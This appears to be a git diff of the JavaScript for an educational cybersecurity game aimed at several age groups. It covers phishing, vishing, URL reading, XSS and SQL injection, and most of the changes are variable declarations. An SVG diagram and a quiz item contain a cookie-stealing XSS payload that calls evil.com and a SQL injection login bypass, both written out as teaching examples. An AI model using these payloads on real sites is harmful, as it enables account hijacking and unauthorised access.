@@ -42,9 +42,9 @@ window.addEventListener('error',function(e){
 });
 
 // ─── CONFIG ───────────────────────────────────────────────────────────────────
-const SUPABASE_URL='https://xyzxyzxyz.supabase.co';
-const SUPABASE_ANON_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpmaWJ2dWtpdWlwdGhraGFuamZnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ0NzY0NjQsImV4cCI6MjEwMDA1MjQ2NH0.h47FGRdchnugqjH4GYEl2qCIMRsVzxx7QAOh67ZTVqc';
-const sb=supabase.createClient(SUPABASE_URL,SUPABASE_ANON_KEY);
+var SUPABASE_URL='https://xyzxyzxyz.supabase.co';
+var SUPABASE_ANON_KEY='eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InpmaWJ2dWtpdWlwdGhraGFuamZnIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODQ0NzY0NjQsImV4cCI6MjEwMDA1MjQ2NH0.h47FGRdchnugqjH4GYEl2qCIMRsVzxx7QAOh67ZTVqc';
+var sb=supabase.createClient(SUPABASE_URL,SUPABASE_ANON_KEY);
 
 // ─── SUPABASE ─────────────────────────────────────────────────────────────────
 async function getCount(){try{var r=await sb.from('player_count').select('count').eq('id',1).single();return r.data?r.data.count:0;}catch(e){return 0;}}
@@ -55,7 +55,7 @@ async function getLeaderboard(){try{var r=await sb.from('leaderboard').select('*
 async function saveLeaderboard(){try{if(!ST.playerName)return;await sb.from('leaderboard').upsert({name:ST.playerName,xp:ST.xp,profile:ST.profile||'pro',badges:earnedBadges().length,updated_at:new Date().toISOString()},{onConflict:'name'});}catch(e){console.error('leaderboard save failed',e);}}
 
 // ─── DIAGRAMS ────────────────────────────────────────────────────────────────
-const DIAGRAMS={
+var DIAGRAMS={
 1:'<svg class="diagram" viewBox="0 0 680 220" xmlns="http://www.w3.org/2000/svg" style="width:100%;border-radius:4px"><rect width="680" height="220" fill="#060a06" rx="4"/><rect x="10" y="10" width="660" height="200" fill="#0c160c" rx="3" stroke="#1a2e1a"/><rect x="10" y="10" width="660" height="28" fill="#1a2e1a" rx="3"/><text x="24" y="29" fill="#3d6b3a" font-size="12" font-family="monospace">📧 PHISHING EMAIL — SPOT THE RED FLAGS</text><rect x="24" y="48" width="632" height="18" fill="#1a0a0a" rx="2" stroke="#ef4444" stroke-width="1"/><text x="30" y="61" fill="#ef4444" font-size="11" font-family="monospace">FROM: security@nexac0rp.com</text><text x="500" y="61" fill="#f97316" font-size="10" font-family="monospace">⚠️ TYPOSQUAT (0 not o)</text><rect x="24" y="72" width="632" height="18" fill="#1a0a0a" rx="2" stroke="#ef4444" stroke-width="1"/><text x="30" y="85" fill="#ef4444" font-size="11" font-family="monospace">SUBJECT: ⚠️ URGENT: Your account suspended in 24 hours!</text><text x="500" y="85" fill="#f97316" font-size="10" font-family="monospace">⚠️ URGENCY TACTIC</text><rect x="24" y="96" width="632" height="70" fill="#0a0a0a" rx="2" stroke="#1a2e1a"/><text x="30" y="114" fill="#c8f7c5" font-size="11" font-family="monospace">We detected unusual activity. Verify IMMEDIATELY or be SUSPENDED.</text><text x="30" y="132" fill="#06b6d4" font-size="11" font-family="monospace" text-decoration="underline">http://nexacorp-security.verify-now.tk/login</text><text x="30" y="148" fill="#ef4444" font-size="10" font-family="monospace">⚠️ FAKE DOMAIN: verify-now.tk is NOT NexaCorp!</text><text x="30" y="162" fill="#f97316" font-size="11" font-family="monospace">Failure = permanent termination.</text><text x="400" y="162" fill="#f97316" font-size="10" font-family="monospace">⚠️ SCARE TACTIC</text><rect x="24" y="176" width="632" height="30" fill="#0a1a0a" rx="2" stroke="#00ff41" stroke-width="1"/><text x="30" y="196" fill="#00ff41" font-size="10" font-family="monospace">✅ DEFENCE: Verify independently — call IT using the official number, never click the link!</text></svg>',
 
 2:'<svg class="diagram" viewBox="0 0 680 180" xmlns="http://www.w3.org/2000/svg" style="width:100%;border-radius:4px"><rect width="680" height="180" fill="#060a06" rx="4"/><rect x="10" y="10" width="660" height="160" fill="#0c160c" rx="3" stroke="#1a2e1a"/><rect x="10" y="10" width="660" height="28" fill="#1a2e1a" rx="3"/><text x="24" y="29" fill="#3d6b3a" font-size="12" font-family="monospace">🎙️ VISHING ATTACK FLOW</text><rect x="20" y="50" width="90" height="44" rx="4" fill="#1a0a0a" stroke="#ef4444"/><text x="65" y="70" fill="#ef4444" font-size="18" text-anchor="middle">🦹</text><text x="65" y="86" fill="#ef4444" font-size="9" font-family="monospace" text-anchor="middle">ATTACKER</text><text x="120" y="76" fill="#f97316" font-size="16" font-family="monospace">→</text><rect x="140" y="50" width="110" height="44" rx="4" fill="#1a1a0a" stroke="#f59e0b"/><text x="195" y="68" fill="#f59e0b" font-size="9" font-family="monospace" text-anchor="middle">SPOOFED CALLER ID</text><text x="195" y="82" fill="#3d6b3a" font-size="9" font-family="monospace" text-anchor="middle">"Appears as Your Bank"</text><text x="260" y="76" fill="#f97316" font-size="16" font-family="monospace">→</text><rect x="280" y="50" width="110" height="44" rx="4" fill="#1a1a0a" stroke="#f59e0b"/><text x="335" y="68" fill="#f59e0b" font-size="9" font-family="monospace" text-anchor="middle">CREATES URGENCY</text><text x="335" y="82" fill="#3d6b3a" font-size="9" font-family="monospace" text-anchor="middle">"Act in 10 mins!"</text><text x="400" y="76" fill="#f97316" font-size="16" font-family="monospace">→</text><rect x="420" y="50" width="110" height="44" rx="4" fill="#1a0a0a" stroke="#ef4444"/><text x="475" y="68" fill="#ef4444" font-size="9" font-family="monospace" text-anchor="middle">REQUESTS DATA</text><text x="475" y="82" fill="#3d6b3a" font-size="9" font-family="monospace" text-anchor="middle">"Give us your PIN"</text><rect x="20" y="108" width="640" height="46" fill="#0a1a0a" rx="3" stroke="#00ff41" stroke-width="1"/><text x="30" y="126" fill="#00ff41" font-size="11" font-family="monospace">✅ DEFENCE: Hang up. Call your bank using the number on the BACK of your card.</text><text x="30" y="144" fill="#3d6b3a" font-size="10" font-family="monospace">Legitimate banks NEVER ask for full PIN or password over the phone. Call spoofing is easy.</text></svg>',
@@ -69,8 +69,6 @@ const DIAGRAMS={
 6:'<svg class="diagram" viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg" style="width:100%;border-radius:4px"><rect width="680" height="190" fill="#060a06" rx="4"/><rect x="10" y="10" width="660" height="170" fill="#0c160c" rx="3" stroke="#1a2e1a"/><rect x="10" y="10" width="660" height="28" fill="#1a2e1a" rx="3"/><text x="24" y="29" fill="#3d6b3a" font-size="12" font-family="monospace">🔒 HOW TO READ A URL — SAFE vs DANGEROUS</text><rect x="20" y="46" width="640" height="28" rx="3" fill="#0a1a0a" stroke="#00ff41"/><text x="30" y="65" fill="#00ff41" font-size="12" font-family="monospace">https://www.mybank.com/login</text><text x="530" y="65" fill="#00ff41" font-size="10" font-family="monospace">✅ SAFE</text><rect x="20" y="80" width="640" height="28" rx="3" fill="#1a0a0a" stroke="#ef4444"/><text x="30" y="99" fill="#ef4444" font-size="12" font-family="monospace">http://mybank.com/login</text><text x="480" y="99" fill="#ef4444" font-size="10" font-family="monospace">❌ NO HTTPS = UNSAFE</text><rect x="20" y="114" width="640" height="28" rx="3" fill="#1a0a0a" stroke="#ef4444"/><text x="30" y="133" fill="#c8f7c5" font-size="12" font-family="monospace">https://</text><text x="107" y="133" fill="#ef4444" font-size="12" font-family="monospace">mybank.com.verify-now.tk</text><text x="430" y="133" fill="#c8f7c5" font-size="12" font-family="monospace">/login</text><text x="540" y="133" fill="#ef4444" font-size="10" font-family="monospace">❌ FAKE DOMAIN</text><rect x="20" y="154" width="640" height="22" fill="#0a1a0a" rx="3" stroke="#1a2e1a"/><text x="30" y="169" fill="#3d6b3a" font-size="10" font-family="monospace">💡 The real domain is the part just BEFORE the first single slash. verify-now.tk = the real domain above!</text></svg>',
 
 7:'<svg class="diagram" viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg" style="width:100%;border-radius:4px"><rect width="680" height="210" fill="#060a06" rx="4"/><rect x="10" y="10" width="660" height="190" fill="#0c160c" rx="3" stroke="#1a2e1a"/><rect x="10" y="10" width="660" height="28" fill="#1a2e1a" rx="3"/><text x="24" y="29" fill="#3d6b3a" font-size="12" font-family="monospace">📱 REAL vs FAKE SOCIAL MEDIA ACCOUNT</text><rect x="20" y="46" width="300" height="132" rx="4" fill="#0a1a0a" stroke="#00ff41"/><text x="170" y="66" fill="#00ff41" font-size="11" font-family="monospace" text-anchor="middle">✅ REAL ACCOUNT</text><text x="36" y="86" fill="#c8f7c5" font-size="10" font-family="monospace">👤 Joined: 5+ years ago</text><text x="36" y="102" fill="#c8f7c5" font-size="10" font-family="monospace">📸 Real personal photos</text><text x="36" y="118" fill="#c8f7c5" font-size="10" font-family="monospace">📝 3-5 posts/day, varied topics</text><text x="36" y="134" fill="#c8f7c5" font-size="10" font-family="monospace">👥 Gradual organic follower growth</text><text x="36" y="150" fill="#c8f7c5" font-size="10" font-family="monospace">💬 Genuine engagement in comments</text><text x="36" y="166" fill="#00ff41" font-size="10" font-family="monospace">✅ Consistent history</text><rect x="360" y="46" width="300" height="132" rx="4" fill="#1a0a0a" stroke="#ef4444"/><text x="510" y="66" fill="#ef4444" font-size="11" font-family="monospace" text-anchor="middle">❌ BOT / FAKE ACCOUNT</text><text x="376" y="86" fill="#f97316" font-size="10" font-family="monospace">⚠️ Created 2-3 weeks ago</text><text x="376" y="102" fill="#f97316" font-size="10" font-family="monospace">⚠️ AI-generated profile photo</text><text x="376" y="118" fill="#f97316" font-size="10" font-family="monospace">⚠️ 40+ posts/day, one topic</text><text x="376" y="134" fill="#f97316" font-size="10" font-family="monospace">⚠️ 10,000 followers in 2 weeks</text><text x="376" y="150" fill="#f97316" font-size="10" font-family="monospace">⚠️ Generic copy-paste comments</text><text x="376" y="166" fill="#ef4444" font-size="10" font-family="monospace">❌ No personal history</text></svg>',
-
-8:'<svg class="diagram" viewBox="0 0 680 200" xmlns="http://www.w3.org/2000/svg" style="width:100%;border-radius:4px"><rect width="680" height="200" fill="#060a06" rx="4"/><rect x="10" y="10" width="660" height="180" fill="#0c160c" rx="3" stroke="#1a2e1a"/><rect x="10" y="10" width="660" height="28" fill="#1a2e1a" rx="3"/><text x="24" y="29" fill="#3d6b3a" font-size="12" font-family="monospace">🕸️ XSS FLOW + SQL INJECTION EXPLAINED</text><text x="24" y="52" fill="#f97316" font-size="10" font-family="monospace">XSS: Attacker posts script → stored in DB → every visitor loads page → script runs → cookies stolen → ACCOUNT HIJACKED</text><rect x="20" y="60" width="640" height="24" rx="3" fill="#080c08" stroke="#1a2e1a"/><text x="30" y="76" fill="#3d6b3a" font-size="10" font-family="monospace">PAYLOAD: &lt;script&gt;document.location="http://evil.com/?c="+document.cookie&lt;/script&gt;</text><text x="24" y="104" fill="#f97316" font-size="10" font-family="monospace">SQL INJECTION: Normal query vs injected query</text><rect x="20" y="112" width="640" height="22" rx="3" fill="#0a1a0a" stroke="#00ff41"/><text x="30" y="127" fill="#00ff41" font-size="10" font-family="monospace">NORMAL: SELECT * FROM users WHERE username='john' AND password='pass123'</text><rect x="20" y="138" width="640" height="22" rx="3" fill="#1a0808" stroke="#ef4444"/><text x="30" y="153" fill="#ef4444" font-size="10" font-family="monospace">ATTACK:  SELECT * FROM users WHERE username='admin'</text><text x="390" y="153" fill="#f59e0b" font-size="10" font-family="monospace">--' AND password='x' ← IGNORED!</text><rect x="20" y="168" width="640" height="18" fill="#0a1a0a" rx="3" stroke="#1a2e1a"/><text x="30" y="181" fill="#3d6b3a" font-size="10" font-family="monospace">✅ FIX: Parameterised queries + input sanitisation + Content Security Policy headers</text></svg>',
 
 9:'<svg class="diagram" viewBox="0 0 680 190" xmlns="http://www.w3.org/2000/svg" style="width:100%;border-radius:4px"><rect width="680" height="190" fill="#060a06" rx="4"/><rect x="10" y="10" width="660" height="170" fill="#0c160c" rx="3" stroke="#1a2e1a"/><rect x="10" y="10" width="660" height="28" fill="#1a2e1a" rx="3"/><text x="24" y="29" fill="#3d6b3a" font-size="12" font-family="monospace">🔐 CAESAR CIPHER → MODERN TLS ENCRYPTION</text><text x="24" y="52" fill="#a855f7" font-size="10" font-family="monospace">CAESAR CIPHER (shift 3): A→D  B→E  C→F ... ATTACK → DWWDFN (only 25 possible shifts!)</text><rect x="20" y="60" width="640" height="18" rx="3" fill="#0a0a1a" stroke="#a855f7"/><text x="30" y="73" fill="#c8f7c5" font-size="10" font-family="monospace">PLAIN:   A B C D E F G H I J K  ...  X Y Z</text><rect x="20" y="82" width="640" height="18" rx="3" fill="#0a0a1a" stroke="#a855f7"/><text x="30" y="95" fill="#a855f7" font-size="10" font-family="monospace">CIPHER:  D E F G H I J K L M N  ...  A B C</text><text x="24" y="118" fill="#06b6d4" font-size="10" font-family="monospace">MODERN TLS/HTTPS: Browser ← RSA key exchange → then AES-256 encrypts all data</text><rect x="20" y="126" width="640" height="30" rx="3" fill="#0a0a1a" stroke="#06b6d4"/><text x="30" y="142" fill="#06b6d4" font-size="10" font-family="monospace">AES-256: 2^256 possible keys = more atoms than exist in the observable universe</text><text x="30" y="156" fill="#3d6b3a" font-size="10" font-family="monospace">Caesar: 25 possible shifts. A computer cracks it instantly. See the difference?</text></svg>',
 
@@ -96,7 +94,7 @@ const DIAGRAMS={
 };
 
 // ─── PROFILES ─────────────────────────────────────────────────────────────────
-const PROFILES={
+var PROFILES={
   cadet:{label:'Cyber Cadet',age:'6-10',emoji:'🐣',color:'#f59e0b',xpLabel:'⭐ Stars'},
   explorer:{label:'Cyber Explorer',age:'11-14',emoji:'🎮',color:'#06b6d4',xpLabel:'🎮 XP'},
   analyst:{label:'Cyber Analyst',age:'15-17',emoji:'🧑',color:'#a855f7',xpLabel:'🔮 XP'},
@@ -104,7 +102,7 @@ const PROFILES={
 };
 
 // ─── DOMAINS ──────────────────────────────────────────────────────────────────
-const DOMAINS={
+var DOMAINS={
   ops:{label:'Security Operations',weight:34,color:'#06b6d4'},
   vuln:{label:'Vulnerability Management',weight:26,color:'#f97316'},
   ir:{label:'Incident Response',weight:24,color:'#ef4444'},
@@ -112,7 +110,7 @@ const DOMAINS={
 };
 
 // ─── BADGES ───────────────────────────────────────────────────────────────────
-const BADGES=[
+var BADGES=[
   {id:'first_blood',icon:'🩸',label:'First Blood',desc:'Complete your first chapter',check:function(d){return d.length>=1;}},
   {id:'cyber_aware',icon:'🥉',label:'Cyber Aware',desc:'Complete Ch.1, 2 & 3',check:function(d){return d.includes(1)&&d.includes(2)&&d.includes(3);}},
   {id:'halfway',icon:'⚡',label:'Halfway There',desc:'Complete 10 chapters',check:function(d){return d.length>=10;}},
@@ -125,7 +123,7 @@ const BADGES=[
 function earnedBadges(){return BADGES.filter(function(b){return b.check(ST.doneChaps,ST.xp);});}
 
 // ─── GAME DATA ────────────────────────────────────────────────────────────────
-const GD=[
+var GD=[
   {id:1,title:'Phishing & Social Engineering',icon:'🎣',color:'#ef4444',domain:'ir',cis:'9,14',
    story:{cadet:'WELCOME CYBER CADET!\n\nSomeone sent a strange email to your teacher. Can you help spot the trick?',
           pro:'NEXACORP — Day 1\n\nThree employees fell for suspicious emails. Investigate and train the team — fast.'},
@@ -152,14 +150,14 @@ const GD=[
           pro:'NEXACORP — Week 2\n\nThe help desk received suspicious calls claiming to be IT Support requesting credentials.'},
    challenges:[
     {type:'mcq',title:'MISSION 2-A: Spot the Vishing Call',
-     question:"You receive this call:\n\n'Hi, this is Mike from IT Support. We detected a virus on your computer and need your username and password immediately to fix it. This is urgent — your account will be locked in 10 minutes.'\n\nWhat is the BIGGEST red flag?",
+     question:'You receive this call:\n\n"Hi, this is Mike from IT Support. We detected a virus on your computer and need your username and password immediately to fix it. This is urgent — your account will be locked in 10 minutes."\n\nWhat is the BIGGEST red flag?',
      options:['The caller said his name is Mike','IT support asking for your password over the phone','The caller mentioned a virus','The call came during working hours'],
      correct:1,explanations:['❌ Giving a name is not a red flag.','✅ Legitimate IT staff NEVER ask for your password over the phone.','❌ Mentioning a virus creates urgency but is not the primary red flag.','❌ Timing alone is not a red flag.'],xp:100},
     {type:'spot_flags',title:'MISSION 2-B: Flag the Vishing Tactics',desc:'Tap all 4 vishing tactics in this call transcript.',
      transcript:'"Good afternoon, I am calling from Microsoft Security. [1] We detected your computer is sending viruses and [2] if we do not fix it in 15 minutes your account will be permanently deleted. I need you to [3] download a remote access tool so I can fix it, and [4] provide your credit card for the $49.99 security fee."',
      spots:[{id:'fa',label:'False authority — impersonating Microsoft'},{id:'ur',label:'Artificial urgency — 15 minutes or deleted'},{id:'ra',label:'Remote access request — gives attacker full control'},{id:'py',label:'Unexpected payment request — financial fraud'}],xp:100},
     {type:'mcq',title:'MISSION 2-C: The Right Response',
-     question:"A caller claims to be from your bank and says your account is compromised. They ask for your account number and PIN. What do you do?",
+     question:'A caller claims to be from your bank and says your account is compromised. They ask for your account number and PIN. What do you do?',
      options:['Confirm your details — it could be real','Ask for their employee ID then confirm','Hang up and call your bank using the number on the back of your card','Tell them your account number but not your PIN'],
      correct:2,explanations:['❌ Never confirm details to an inbound caller.','❌ Employee IDs can be fabricated.','✅ Always hang up and call back using a verified number.','❌ Partial information is still enough for attackers.'],xp:75}
    ],
@@ -269,7 +267,7 @@ const GD=[
      options:['The comment contains an external link','The script runs in every visitor\'s browser stealing session cookies','The word cookie triggers a security alert','HTML tags are not allowed in comments'],
      correct:1,explanations:['❌ External links alone are not the issue.','✅ XSS! The script runs in victims browsers and sends cookies to attacker enabling account takeover.','❌ Cookie is a technical term not a trigger.','❌ HTML tags are fine if sanitized.'],xp:100},
     {type:'mcq',title:'MISSION 8-B: SQL Injection',
-     question:"An attacker enters: admin'--\n\nQuery: SELECT * FROM users WHERE username='[INPUT]' AND password='[PASS]'\n\nWhat happens?",
+     question:'An attacker enters: admin\'--\n\nQuery: SELECT * FROM users WHERE username=\'[INPUT]\' AND password=\'[PASS]\'\n\nWhat happens?',
      options:['Nothing — database rejects special characters','The database crashes','The quote ends the string and -- comments out the password check','The input is stored and executed later'],
      correct:2,explanations:['❌ Without sanitization DB processes it as SQL code.','❌ Injection can crash databases but not what happens here.','✅ Password check commented out — attacker logs in as admin with no password!','❌ That is stored XSS not SQL injection.'],xp:100}
    ],
@@ -451,7 +449,7 @@ const GD=[
 ];
 
 // ─── STATE ────────────────────────────────────────────────────────────────────
-const ST={
+var ST={
   screen:'age_select',profile:null,
   chapIdx:0,sceneIdx:0,chalIdx:0,
   xp:0,codex:[],doneChaps:[],
@@ -467,7 +465,7 @@ const ST={
   typerText:'',typerIdx:0,typerTimer:null
 };
 
-const MAX_XP=GD.reduce(function(a,c){return a+c.challenges.reduce(function(b,ch){return b+ch.xp;},0);},0);
+var MAX_XP=GD.reduce(function(a,c){return a+c.challenges.reduce(function(b,ch){return b+ch.xp;},0);},0);
 
 function getLvl(xp){
   if(xp<200)return[1,'Script Kiddie'];
@@ -530,9 +528,9 @@ function buildApp(){
 
 // ─── HEADER ───────────────────────────────────────────────────────────────────
 function hdr(){
-  const lvl=getLvl(ST.xp);
-  const pct=Math.min(ST.xp/MAX_XP*100,100);
-  const p=PROFILES[ST.profile||'pro'];
+  var lvl=getLvl(ST.xp);
+  var pct=Math.min(ST.xp/MAX_XP*100,100);
+  var p=PROFILES[ST.profile||'pro'];
   return '<div class="hdr">'+
     '<div style="color:'+pc()+';font-size:13px;font-weight:bold;letter-spacing:2px">⚡ CYBERGUARD</div>'+
     '<div style="display:flex;align-items:center;gap:6px">'+
@@ -553,8 +551,8 @@ function hdr(){
 
 // ─── AGE SELECT ───────────────────────────────────────────────────────────────
 function buildAge(){
-  const cards=Object.keys(PROFILES).map(function(k){
-    const p=PROFILES[k];
+  var cards=Object.keys(PROFILES).map(function(k){
+    var p=PROFILES[k];
     return '<div class="age-card" onclick="selProfile(\''+k+'\')" style="border-color:#1a2e1a">'+
       '<div style="font-size:40px;margin-bottom:10px">'+p.emoji+'</div>'+
       '<div style="color:'+p.color+';font-weight:bold;font-size:16px;margin-bottom:4px">'+p.label+'</div>'+
@@ -574,11 +572,11 @@ function buildAge(){
 
 // ─── TITLE ────────────────────────────────────────────────────────────────────
 function buildTitle(){
-  const chaps=GD.map(function(ch,i){
-    const unlocked=i===0||ST.doneChaps.includes(GD[i-1].id);
-    const done=ST.doneChaps.includes(ch.id);
-    const dom=DOMAINS[ch.domain];
-    const totalXP=ch.challenges.reduce(function(a,c){return a+c.xp;},0);
+  var chaps=GD.map(function(ch,i){
+    var unlocked=i===0||ST.doneChaps.includes(GD[i-1].id);
+    var done=ST.doneChaps.includes(ch.id);
+    var dom=DOMAINS[ch.domain];
+    var totalXP=ch.challenges.reduce(function(a,c){return a+c.xp;},0);
     return '<div onclick="'+(unlocked?'startChap('+i+')':'')+'" style="display:flex;align-items:center;gap:14px;background:#0c160c;border:1px solid '+(done?ch.color:unlocked?'#1a2e1a':'#111')+';border-radius:3px;padding:14px 18px;margin-bottom:8px;cursor:'+(unlocked?'pointer':'not-allowed')+';opacity:'+(unlocked?1:0.35)+'">'+
       '<div style="font-size:24px">'+ch.icon+'</div>'+
       '<div style="flex:1">'+
@@ -592,9 +590,9 @@ function buildTitle(){
     '</div>';
   }).join('');
 
-  const countBadge=ST.playerCount!==null?'<div style="display:inline-flex;align-items:center;gap:8px;background:#0c160c;border:1px solid #1a2e1a;border-radius:20px;padding:5px 16px;margin-bottom:16px;font-size:12px"><span>👾</span><span class="dim">Agents who\'ve played:</span><span style="color:#00ff41;font-weight:bold">'+ST.playerCount.toLocaleString()+'</span></div>':'';
+  var countBadge=ST.playerCount!==null?'<div style="display:inline-flex;align-items:center;gap:8px;background:#0c160c;border:1px solid #1a2e1a;border-radius:20px;padding:5px 16px;margin-bottom:16px;font-size:12px"><span>👾</span><span class="dim">Agents who\'ve played:</span><span style="color:#00ff41;font-weight:bold">'+ST.playerCount.toLocaleString()+'</span></div>':'';
 
-  const winBanner=ST.doneChaps.length===GD.length?'<div class="card" style="border-color:#00ff41;text-align:center;padding:24px;margin-top:16px"><div style="font-size:32px;margin-bottom:8px">🏆</div><div style="color:#00ff41;font-weight:bold;font-size:16px">PHANTOM NET DEFEATED!</div><div style="color:#c8f7c5;font-size:13px;margin-top:6px">Final Score: '+ST.xp+' XP · Rank: '+getLvl(ST.xp)[1]+'</div><button class="btn-p" onclick="ST.showCertificate=true;render()" style="margin-top:12px">📜 VIEW YOUR CERTIFICATE</button></div>':'';
+  var winBanner=ST.doneChaps.length===GD.length?'<div class="card" style="border-color:#00ff41;text-align:center;padding:24px;margin-top:16px"><div style="font-size:32px;margin-bottom:8px">🏆</div><div style="color:#00ff41;font-weight:bold;font-size:16px">PHANTOM NET DEFEATED!</div><div style="color:#c8f7c5;font-size:13px;margin-top:6px">Final Score: '+ST.xp+' XP · Rank: '+getLvl(ST.xp)[1]+'</div><button class="btn-p" onclick="ST.showCertificate=true;render()" style="margin-top:12px">📜 VIEW YOUR CERTIFICATE</button></div>':'';
 
   return '<div class="main">'+
     '<div style="text-align:center;padding:24px 0 20px">'+
@@ -612,9 +610,9 @@ function buildTitle(){
 
 // ─── STORY ────────────────────────────────────────────────────────────────────
 function buildStory(){
-  const chap=GD[ST.chapIdx];
- const p=ST.profile||'pro';
-  const txt=chap.story[p]||chap.story.pro;
+  var chap=GD[ST.chapIdx];
+  var p=ST.profile||'pro';
+  var txt=chap.story[p]||chap.story.pro;
   return '<div class="main">'+
     '<div class="dim">Ch.'+chap.id+' · '+chap.title+'</div>'+
     '<div class="card" style="margin-top:14px;min-height:120px">'+
@@ -629,13 +627,13 @@ function buildStory(){
 
 // ─── CHALLENGE ────────────────────────────────────────────────────────────────
 function buildChallenge(){
-  const chap=GD[ST.chapIdx];
-  const chal=chap.challenges[ST.chalIdx];
-  const body='';
+  var chap=GD[ST.chapIdx];
+  var chal=chap.challenges[ST.chalIdx];
+  var body='';
 
   if(chal.type==='mcq'){
-    const opts=chal.options.map(function(opt,i){
-      const cls='opt'+(ST.selOpt===i?(i===chal.correct?' ok':' bad'):'');
+    var opts=chal.options.map(function(opt,i){
+      var cls='opt'+(ST.selOpt===i?(i===chal.correct?' ok':' bad'):'');
       return '<div class="'+cls+'" onclick="ST.selOpt='+i+';render()">['+String.fromCharCode(65+i)+'] '+opt+'</div>';
     }).join('');
     body='<div class="h2">'+chal.title+'</div>'+
@@ -645,14 +643,14 @@ function buildChallenge(){
   }
 
   if(chal.type==='email_spot'){
-    const found=ST.foundSpots;
+    var found=ST.foundSpots;
     function sp(id,label,col){
-      const active=found.has(id);
-      const color=active?'#00ff41':(col||'#f97316');
-      const border=active?'1px solid #00ff41':'1px dashed #f97316';
+      var active=found.has(id);
+      var color=active?'#00ff41':(col||'#f97316');
+      var border=active?'1px solid #00ff41':'1px dashed #f97316';
       return '<span style="cursor:pointer;border-bottom:'+border+';color:'+color+'" onclick="addSpot(\''+id+'\')">'+label+'</span>';
     }
-    const foundList=[...found].map(function(id){var s=chal.spots.find(function(x){return x.id===id;});return s?'<div style="color:#00ff41;font-size:12px;margin-top:5px">✓ '+s.label+'</div>':'';}).join('');
+    var foundList=[...found].map(function(id){var s=chal.spots.find(function(x){return x.id===id;});return s?'<div style="color:#00ff41;font-size:12px;margin-top:5px">✓ '+s.label+'</div>':'';}).join('');
     body='<div class="h2">'+chal.title+'</div>'+
       '<div class="dim">'+chal.desc+'</div>'+
       '<div class="card" style="background:#060a06;margin-top:12px;font-size:13px">'+
@@ -664,9 +662,9 @@ function buildChallenge(){
   }
 
   if(chal.type==='spot_flags'){
-    const found2=ST.foundSpots;
+    var found2=ST.foundSpots;
     function spf(id,text){
-      const active=found2.has(id);
+      var active=found2.has(id);
       return '<span style="cursor:pointer;background:'+(active?'#1a3a1a':'transparent')+';border-bottom:'+(active?'1px solid #00ff41':'1px dashed #f97316')+';color:'+(active?'#00ff41':'#f97316')+';padding:1px 2px" onclick="addSpot(\''+id+'\')">'+text+'</span>';
     }
     var foundList2=[...found2].map(function(id){var s=chal.spots.find(function(x){return x.id===id;});return s?'<div style="color:#00ff41;font-size:12px;margin-top:5px">✓ '+s.label+'</div>':'';}).join('');
@@ -680,20 +678,20 @@ function buildChallenge(){
   }
 
   if(chal.type==='classify'){
-    const ans=ST.classifyAnswers;
-    const selItem=ST.selectedItem;
-    const allPlaced=chal.items.every(function(item){return ans.hasOwnProperty(item.id);});
-    const itemBtns=chal.items.map(function(item){
-      const isPlaced=ans.hasOwnProperty(item.id);
-      const isCorrect=isPlaced&&ans[item.id]===item.correct;
-      const borderColor=isPlaced?(isCorrect?'#00ff41':'#ef4444'):(selItem===item.id?'#f59e0b':'#1a2e1a');
-      const bg=isPlaced?(isCorrect?'#0a1a0a':'#1a0a0a'):(selItem===item.id?'#1a1a0a':'#0c160c');
+    var ans=ST.classifyAnswers;
+    var selItem=ST.selectedItem;
+    var allPlaced=chal.items.every(function(item){return ans.hasOwnProperty(item.id);});
+    var itemBtns=chal.items.map(function(item){
+      var isPlaced=ans.hasOwnProperty(item.id);
+      var isCorrect=isPlaced&&ans[item.id]===item.correct;
+      var borderColor=isPlaced?(isCorrect?'#00ff41':'#ef4444'):(selItem===item.id?'#f59e0b':'#1a2e1a');
+      var bg=isPlaced?(isCorrect?'#0a1a0a':'#1a0a0a'):(selItem===item.id?'#1a1a0a':'#0c160c');
       return '<div onclick="ST.selectedItem=\''+(isPlaced?null:item.id)+'\';render()" style="border:1px solid '+borderColor+';background:'+bg+';border-radius:3px;padding:10px 14px;margin-bottom:8px;cursor:pointer;font-size:12px;white-space:pre-wrap;line-height:1.6">'+
         (isPlaced?'<span style="color:'+(isCorrect?'#00ff41':'#ef4444')+'">'+(isCorrect?'✅':'❌')+' </span>':'')+item.label+
         (isPlaced?'<div style="font-size:10px;color:#3d6b3a;margin-top:4px">'+item.explain+'</div>':'')+
       '</div>';
     }).join('');
-    const buckets=chal.buckets.map(function(b,i){
+    var buckets=chal.buckets.map(function(b,i){
       return '<div onclick="placeItem('+i+')" style="flex:1;border:1px solid '+(selItem?'#f59e0b':'#1a2e1a')+';background:'+(selItem?'#1a1a0a':'#0c160c')+';border-radius:3px;padding:12px;text-align:center;cursor:'+(selItem?'pointer':'default')+';font-size:12px;transition:all 0.15s">'+b+'</div>';
     }).join('');
     body='<div class="h2">'+chal.title+'</div>'+
@@ -705,8 +703,8 @@ function buildChallenge(){
   }
 
   if(chal.type==='caesar'){
-    const decoded=ST.shift>0?decipher(chal.encrypted,ST.shift):'——————————————————';
-    const correct=decoded===chal.answer;
+    var decoded=ST.shift>0?decipher(chal.encrypted,ST.shift):'——————————————————';
+    var correct=decoded===chal.answer;
     body='<div class="h2">'+chal.title+'</div>'+
       '<div class="card" style="background:#060a06">'+
         '<div class="dim">ENCRYPTED:</div>'+
@@ -724,7 +722,7 @@ function buildChallenge(){
   }
 
   if(chal.type==='log_analysis'){
-    const rows=chal.logs.map(function(log){
+    var rows=chal.logs.map(function(log){
       return '<tr class="'+(ST.selLog===log.id?'sel':'')+'" onclick="ST.selLog='+log.id+';render()">'+
         '<td>'+log.id+'</td><td>'+log.time+'</td><td>'+log.src+'</td><td>'+log.dst+'</td><td>'+log.port+'</td><td>'+log.proto+'</td>'+
       '</tr>';
@@ -735,9 +733,9 @@ function buildChallenge(){
       (ST.selLog!==null?'<button class="btn-p" onclick="submitLog()">CONFIRM SELECTION</button>':'');
   }
 
